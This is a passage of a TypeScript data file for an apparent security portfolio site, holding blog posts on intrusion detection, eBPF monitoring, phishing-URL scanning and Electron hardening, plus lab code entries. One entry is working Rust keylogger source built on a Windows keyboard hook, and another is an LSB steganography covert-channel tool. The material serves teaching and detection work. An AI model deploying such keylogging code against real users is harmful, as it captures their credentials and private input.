SentinelFlow uses libpcap with a polymorphic \`PacketCapture\` interface, \`LiveCapture\` for real-time traffic and \`PcapFileReader\` for offline analysis. The critical optimisation is BPF (Berkeley Packet Filter): a filter expression like \`tcp port 80\` is compiled via \`pcap_compile()\` and runs **inside the kernel**. Packets that don't match are never copied to userspace, which is orders of magnitude more efficient than filtering in application code.

### Layered Protocol Dissection

Network frames are nested structures. You cannot jump to a fixed byte offset because each layer has variable length:

1. **Ethernet** (14 bytes), \`ntohs\` on EtherType dispatches to IPv4 (\`0x0800\`) or ARP (\`0x0806\`)
2. **IPv4**, IHL (Internet Header Length) field tells you where L4 starts. Variable due to IP options.
3. **TCP**, \`data_offset\` field tells you where the payload begins. Variable due to TCP options.
4. **UDP** (8 bytes), Fixed header, but conditionally triggers DNS parsing when port is 53
5. **DNS**, Walks label-encoded query names (length-prefixed segments)
6. **ICMP** / **ARP**, Type codes and hardware addresses

Each parser is a stateless free function operating on raw \`const uint8_t*\`, zero copies, zero allocations. The \`ParsedPacket\` struct uses \`std::optional<T>\` for each layer: if a parse fails or the protocol isn't present, the optional stays empty and downstream layers are skipped.

### Snort-Inspired Rule Engine

SentinelFlow implements a subset of the Snort rule language, the de facto standard for signature-based detection:

\`\`\`
alert tcp any any -> any 22 (msg:"SSH brute force"; flags:S; threshold:10,60; sid:2001;)
\`\`\`

Rules are declarative. The **header** acts as a fast pre-filter (protocol, IP, port), while **options** refine the match: flag bitmasks, payload content strings, DNS query length thresholds. The rule parser extracts these into structured objects for the signature matcher to evaluate against each packet.

### Stateful vs. Stateless Detection

Signature matching catches known-bad patterns in individual packets. But many real attacks are distributed across multiple packets:

- **Port scans**, Only visible when you track the set of destination ports per source IP over time. SentinelFlow maintains a \`std::set<uint16_t>\` per IP pair, firing when 15+ unique ports are hit in 60 seconds.
- **SYN floods**, Detected by monitoring half-open connection rates. A \`std::deque\` of SYN timestamps per destination IP, pruned lazily on access. Fires at 100+ SYNs in 10 seconds.
- **DNS tunnelling**, Exfiltration via encoded DNS queries produces anomalously long query names. The detector tracks queries exceeding 50 characters and fires when volume passes threshold.

All stateful detectors use sliding time windows with **lazy pruning**, old entries are removed on the next access rather than by a background thread. This eliminates synchronisation overhead.

### Zero-Copy Parsing Performance

The parsers operate directly on the raw buffer provided by libpcap. No intermediate copies, no dynamic allocation per packet. The \`memcpy\` + \`ntohs/ntohl\` pattern is the standard approach in high-performance packet processing (used in DPDK, PF_RING, and production NIDS). The benchmark proves **500K+ packets/sec** on a single thread, pure parsing throughput measured over synthetic TCP SYN packets.

### Alert Outputs

The alert system uses a strategy pattern, \`AlertManager\` dispatches each alert to all registered outputs:

- **Console**: ANSI color-coded by severity (green → yellow → red → bold red)
- **CSV**: RFC 4180-compliant with proper escaping, ready for SIEM ingestion

Adding a new output (syslog, webhook, Kafka) means implementing a single \`emit()\` method.
    `,
  },
  {
    slug: "ecrsm-deep-dive",
    title: "Deep Dive: eBPF Runtime Monitoring",
    date: "2025-01-15",
    tag: "eBPF",
    takeaway:
      "How to build safe, read-only kernel probes for container security.",
    content: `
## What eBPF actually gives you

eBPF runs small, verified programs inside the Linux kernel without a kernel module or a patched kernel. Before a program loads, the in-kernel verifier rejects anything that could loop forever, read out of bounds, or touch memory it should not. That property is what makes it safe to attach code to hot paths like the syscall boundary.

**ECRSM** is an educational, read-only runtime monitor built on that boundary: kernel eBPF probes, a Go agent, and a React dashboard. It is a synthetic teaching stack, not a production EDR, the point is to make kernel-level visibility legible.

### Where it hooks

ECRSM attaches to kernel tracepoints rather than kprobes, because tracepoints keep a stable ABI across kernel versions:

| Tracepoint | Signal |
|------------|--------|
| \`execve\` | Process execution, the primary lens on reverse shells and suspicious binaries |
| \`connect\` | Outbound connections, C2 beaconing and exfiltration destinations |
| \`ptrace\` | Process injection and debugger attach |
| \`mmap\` | Executable-memory mappings, a signal for shellcode staging |

### The data path

1. **Kernel space**, a C eBPF program fires on each tracepoint and copies *metadata only* (PID, UID, \`comm\`, argv sizes, destination address) into a ring buffer. Never payloads, never secrets.
2. **User space**, a Go agent drains the ring buffer, enriches each event with container and Kubernetes metadata (pod, namespace, image), and evaluates lightweight rules.
3. **Dashboard**, events stream to a React UI over WebSockets, so a syscall in the kernel becomes a row on screen in real time.

Deployment is a Kubernetes DaemonSet via a Helm chart, so exactly one probe runs per node.

### Safety is the whole design

Writing to the kernel is how you crash a machine. ECRSM never does it:

- **Read-only introspection**, tracepoints observe; they do not modify syscall arguments or packet data.
- **Metadata only**, no payload bytes, no environment variables, no file contents leave the kernel.
- **Least privilege**, the agent runs with \`CAP_BPF\` / \`CAP_SYS_ADMIN\` and nothing more.
- **Synthetic simulations**, the "attacks" it surfaces (reverse shells, process injection, suspicious execs) are safe scripted scenarios, so you learn the detection without a real intrusion.

### What it is not

ECRSM is a learning platform. It ships no signatures, blocks nothing, and makes no claim to catch a determined attacker. Its value is pedagogical: it turns the abstract idea of kernel observability into events you can watch on infrastructure you can tear down.
    `,
  },
  {
    slug: "kmp-security",
    title: "Building Offline-First Security Tools with KMP",
    date: "2025-01-02",
    tag: "Kotlin",
    takeaway: "Sharing 100% of security logic across Android, iOS, and Web.",
    content: `
## One security core, five platforms

For a security tool, drift between platforms is a vulnerability. If the iOS build scores a URL with a different heuristic than the Android build, an attacker only has to find the weaker one. **Mehr Guard** removes that gap by sharing its whole detection core across Android, iOS, JVM, JS, and WebAssembly with Kotlin Multiplatform (KMP).

### What lives in \`commonMain\`

The security logic is platform-agnostic and lives once, in shared code:

- **Ensemble ML model**, logistic regression plus gradient boosting, scoring each URL.
- **Heuristics engine**, 25+ checks: homograph and punycode look-alikes, brand-impersonation patterns, redirect chains, suspicious TLDs, embedded credentials, and IP-literal hosts.
- **Threat-intelligence lists**, allow/deny sets, versioned centrally.

Only the thin edges are per-platform, expressed through KMP's \`expect\`/\`actual\`: file access, the QR-camera bridge, and UI. Auditing the security core means reading one codebase, not five.

### Offline by construction

Mehr Guard makes zero network calls. Every score is computed on-device, which is both a privacy guarantee (your browsing history never leaves the phone) and a threat-model decision (no server to compromise, no scan to intercept). The privacy claim is verifiable: a check script asserts zero outbound connections.

### The numbers

| Metric | Value |
|--------|-------|
| F1 on the red-team corpus | 87% |
| P99 scan latency | < 5 ms |
| Automated tests | 1,248+ |
| Built-in red-team scenarios | 19 curated attacks |
| Platform targets | 5 (Android, iOS, JVM, JS, Wasm) |

The built-in red-team suite earns its place next to the F1 number: it holds detection quality steady across refactors, so a change that quietly regresses homograph detection fails the build instead of shipping.
    `,
  },
  {
    slug: "electron-security",
    title: "Securing Electron Apps: A Practical Guide",
    date: "2024-12-20",
    tag: "Electron",
    takeaway: "Handling secrets and IPC securely in modern desktop apps.",
    content: `
## Why Electron is a sharp tool

An Electron app is a browser and a Node.js runtime in one process. If a renderer that loads remote or attacker-influenced content can reach Node, a single XSS becomes remote code execution on the user's machine. Securing Electron is mostly about keeping those two worlds apart. **GitSwitch**, an Electron + React 19 Git client that holds GitHub tokens and a Gemini API key, has to get this right.

### The isolation contract

| Setting | Value | Why |
|---------|-------|-----|
| \`contextIsolation\` | on | Preload and page run in separate JS contexts, so the page cannot tamper with privileged globals |
| \`sandbox\` | on | Renderers get no direct Node.js, no \`require\`, no \`fs\`, no \`child_process\` |
| \`nodeIntegration\` | off | The page never sees Node built-ins |
| Exposed API | \`contextBridge\` allow-list | The preload exposes a small named set of functions, not raw \`ipcRenderer\` |

### IPC as a trust boundary

Every privileged action crosses \`ipcMain.handle\` / \`ipcRenderer.invoke\` on an explicit channel allow-list. The main process treats each message as untrusted input: channels are validated, arguments are sanitised, and long-running calls carry timeouts so a hung git operation cannot wedge the app. There is no "run arbitrary command" bridge; each channel does one narrow thing.

### Handling secrets

Tokens never touch \`localStorage\` or linger in the renderer:

- **At rest**, GitHub personal-access tokens and the Gemini key live in the OS keychain (Keychain on macOS, Credential Manager on Windows, libsecret on Linux), not a plaintext config file.
- **In use**, keys are redacted from logs and wiped from memory after use, so a crash dump or shared log does not leak them.
- **In transit**, the Gemini API is the only outbound egress, and the diff sent for commit-message generation is scoped to what the user is committing.

### The takeaway

The defaults that make Electron convenient, Node in the renderer, the legacy \`remote\` module, broad IPC, are the ones that make it dangerous. GitSwitch inverts them: isolation on, sandbox on, a minimal audited bridge, and secrets in the OS keychain. The result is a desktop app with a web UI that cannot be talked into running code it was not built to run.
    `,
  },
];

export interface LabExperiment {
  id: string;
  title: string;
  status: "ACTIVE" | "ARCHIVED" | "CONCEPT";
  description: string;
  tech: string[];
  objective: string;
  constraints: string;
  codeSnippet: string;
}

export const labExperiments: LabExperiment[] = [
  {
    id: "001",
    title: "Rust Keylogger PoC",
    status: "ARCHIVED",
    description:
      "A Windows-based keylogger demonstrating the usage of SetWindowsHookEx and proper hook chaining for educational detection analysis.",
    tech: ["Rust", "WinAPI", "Unsafe"],
    objective:
      "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
    constraints:
      "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
    codeSnippet: `use std::ptr;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{
    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW,
    TranslateMessage, UnhookWindowsHookEx, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
};

static mut HOOK: HHOOK = ptr::null_mut();

unsafe extern "system" fn keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code >= 0 {
        let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
        // WM_KEYDOWN = 0x0100
        if w_param as u32 == 0x0100 {
            println!("[KEY] vkCode={:03} scanCode={:#06x}", kb.vkCode, kb.scanCode);
        }
    }
    CallNextHookEx(HOOK, n_code, w_param, l_param)
}

fn main() {
    unsafe {
        HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), ptr::null_mut(), 0);
        assert!(!HOOK.is_null(), "Failed to install hook");

        let mut msg = std::mem::zeroed();
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        UnhookWindowsHookEx(HOOK);
    }
}`,
  },
  {
    id: "002",
    title: "Raw Socket Packet Sniffer",
    status: "ACTIVE",
    description:
      "Python script utilizing raw sockets to capture and parse TCP/IP headers manually. Implements basic SYN-scan detection without relying on libpcap.",
    tech: ["Python", "Networking", "Raw Sockets"],
    objective:
      "Manually parse IP/TCP headers to understand protocol structures and detect scanning patterns without relying on Wireshark.",
    constraints:
      "Requires root/admin privileges. Linux only (AF_PACKET). For macOS use BPF socket instead.",
    codeSnippet: `import socket
import struct

ETH_P_IP = 0x0800

def parse_ip(raw: bytes) -> tuple[int, int, str, str]:
    # Skip 14-byte Ethernet header on AF_PACKET
    iph = struct.unpack("!BBHHHBBH4s4s", raw[14:34])
    ihl = (iph[0] & 0xF) * 4
    proto = iph[6]
    src = socket.inet_ntoa(iph[8])
    dst = socket.inet_ntoa(iph[9])
    return ihl + 14, proto, src, dst

def parse_tcp(raw: bytes, offset: int) -> tuple[int, int, int]:
    tcph = struct.unpack("!HHLLBBHHH", raw[offset:offset + 20])
    flags = tcph[5]
    syn = (flags & 0x02) >> 1
    fin = flags & 0x01
    return tcph[0], tcph[1], syn

def sniff() -> None:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
    print("[*] Sniffing TCP — Ctrl+C to stop")
    while True:
        raw, _ = sock.recvfrom(65535)
        try:
            offset, proto, src, dst = parse_ip(raw)
            if proto != 6:  # TCP only
                continue
            sp, dp, syn = parse_tcp(raw, offset)
            if syn:
                print(f"[SYN] {src}:{sp} -> {dst}:{dp}")
        except struct.error:
            continue

if __name__ == "__main__":
    sniff()`,
  },
  {
    id: "003",
    title: "Steganography Tool",
    status: "CONCEPT",
    description:
      "LSB (Least Significant Bit) image steganography in Go. Embeds a length-prefixed payload into the red channel of PNG pixels.",
    tech: ["Go", "Cryptography", "Image Processing"],
    objective:
      "Implement a covert channel by modifying the least significant bits of image pixel data, then verify extraction round-trips cleanly.",
    constraints:
      "Payload size limited to (width × height) / 8 bytes. Not robust against JPEG re-encoding or image resizing.",
    codeSnippet: `package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
)

func embed(img *image.NRGBA, payload []byte) error {
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(payload)))
	bits := append(header, payload...)

	idx := 0
	for y := img.Bounds().Min.Y; y < img.Bounds().Max.Y; y++ {
		for x := img.Bounds().Min.X; x < img.Bounds().Max.X; x++ {
			if idx >= len(bits)*8 {
				return nil
			}
			c := img.NRGBAAt(x, y)
			bytePos, bitPos := idx/8, uint(7-idx%8)
			bit := (bits[bytePos] >> bitPos) & 1
			c.R = (c.R & 0xFE) | bit
			img.SetNRGBA(x, y, color.NRGBA{R: c.R, G: c.G, B: c.B, A: c.A})
			idx++
		}
	}
	return fmt.Errorf("image too small for payload")
}

func main() {
	f, _ := os.Open("cover.png")
	defer f.Close()
	src, _ := png.Decode(f)

	dst := image.NewNRGBA(src.Bounds())
	for y := dst.Bounds().Min.Y; y < dst.Bounds().Max.Y; y++ {
		for x := dst.Bounds().Min.X; x < dst.Bounds().Max.X; x++ {
			dst.Set(x, y, src.At(x, y))
		}
	}

	_ = embed(dst, []byte("CLASSIFIED_PAYLOAD"))

	out, _ := os.Create("stego.png")
	defer out.Close()
	png.Encode(out, dst)
	fmt.Println("Done — payload embedded into stego.png")
}`,
  },
];
